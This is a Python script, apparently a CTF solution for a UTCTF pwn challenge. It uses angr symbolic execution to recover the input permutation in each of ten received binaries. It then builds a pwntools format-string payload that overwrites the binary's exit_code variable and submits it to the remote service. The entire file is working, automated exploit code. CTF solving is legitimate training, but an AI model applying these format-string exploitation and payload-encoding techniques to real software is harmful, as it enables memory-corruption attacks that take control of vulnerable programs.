#!/usr/bin/python3
import angr
import claripy
from pwn import *
from subprocess import Popen, PIPE

context.terminal = ['konsole','-e'] # replace this with your terminal of choice
context.log_level = 'warn'

def gen_payload(path, exit_code):
    FLAG_LEN = 512
    proj = angr.Project(path)
    flag_chars = [claripy.BVS('flag_%d' % i, 8) for i in range(FLAG_LEN)]
    flag = claripy.Concat( *flag_chars + [claripy.BVV(b'\n')])

    e = ELF(path)

    state = proj.factory.call_state(
            e.sym['permute'],
            flag,
            add_options=angr.options.unicorn.union({angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY})
    )

    writes = []
    reads = []

    def mem_write(state):
        write_addr = state.solver.eval(state.inspect.mem_write_address,int)
        if write_addr < 0x1000:
            writes.append(write_addr)

    def mem_read(state):
        read_addr = state.solver.eval(state.inspect.mem_read_address,int)
        if read_addr < 0x1000:
            reads.append(read_addr)

    state.inspect.b('mem_write', when=angr.BP_AFTER, action=mem_write)
    state.inspect.b('mem_read', when=angr.BP_AFTER, action=mem_read)

    simgr = proj.factory.simulation_manager(state)
    simgr.run()

    # transformations[i] = index of char that is now at this position
    transformations = []
    new_transformations = []
    for i in range(FLAG_LEN):
        transformations.append(i)
        new_transformations.append(i)

    for i in range(len(reads)//FLAG_LEN):
        read_sub = reads[FLAG_LEN*i:FLAG_LEN*i+FLAG_LEN]
        write_sub = writes[FLAG_LEN*i:FLAG_LEN*i+FLAG_LEN]
        for j in range(FLAG_LEN):
            # we just read a value from read_sub[j]
            # then it is being written to write_sub[j]
            new_transformations[write_sub[j]] = transformations[read_sub[j]]
        transformations = new_transformations
        new_transformations = []
        for i in range(FLAG_LEN):
            new_transformations.append(0)

    writes = {e.sym['exit_code']: exit_code}

    print(transformations)

    payload = fmtstr_payload(8, writes, write_size='int')
    payload += b' ' * (FLAG_LEN - len(payload))
    encoded_payload = bytearray()
    for i in range(FLAG_LEN):
        encoded_payload.append(32)
    for i in range(FLAG_LEN):
        encoded_payload[transformations[i]] = payload[i]

    return encoded_payload

r = remote('pwn.utctf.live', 5002)
r.recvline()
r.recvline()
r.recvline()
r.recvline()
r.sendline()

for i in range(10):
    print("Solving",i)
    x = r.recvuntil(b"Binary")[:-6]
    exit_code_line = r.recvline()
    exit_code = int(exit_code_line[exit_code_line.rindex(b' ')+1:-1])
    r.recvline()
    p = Popen(['xxd', '-r'], stdout=PIPE, stdin=PIPE, stderr=STDOUT)
    binary = p.communicate(input=x)[0]
    binary_file = open("a.out", "wb")
    binary_file.write(binary)
    binary_file.close()
    payload = gen_payload("a.out",exit_code)
    r.sendline(payload)
    print(r.recvline())
print(r.recvall())
